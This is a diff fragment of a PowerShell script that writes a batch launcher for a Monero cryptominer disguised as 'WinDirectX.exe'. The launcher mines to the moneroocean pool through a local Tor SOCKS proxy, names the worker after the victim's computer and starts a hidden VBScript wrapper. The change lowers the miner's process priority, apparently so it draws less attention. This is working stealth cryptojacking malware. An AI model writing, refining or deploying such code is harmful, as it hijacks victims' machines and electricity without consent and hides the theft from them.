@@ -107,7 +107,7 @@ $cmd = "@echo off`n" +
        "tasklist /FI `"IMAGENAME eq WinDirectX.exe`" 2>NUL | find /I /N `"WinDirectX.exe`">NUL`n" +
        "if %ERRORLEVEL%==0 exit`n" +
        "timeout /t 30 /nobreak >nul`n" +
-       "start /b /normal $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
+       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`n" +
